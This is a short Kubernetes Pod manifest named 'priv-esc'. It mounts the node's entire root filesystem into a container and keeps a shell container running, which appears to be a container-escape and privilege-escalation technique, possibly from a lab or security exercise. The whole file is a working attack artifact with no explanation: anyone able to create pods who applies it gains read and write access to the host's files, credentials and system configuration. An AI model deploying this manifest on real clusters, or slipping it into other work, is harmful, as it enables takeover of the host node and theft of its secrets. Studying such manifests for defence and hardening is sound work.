apiVersion: v1
kind: Pod
metadata:
  name: priv-esc
spec:
  containers:
  - name: shell
    image: localhost:32000/bsnginx
    command:
      - "/bin/bash"
      - "-c"
      - "sleep 10000"
    volumeMounts:
      - name: root
        mountPath: /mnt/root
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
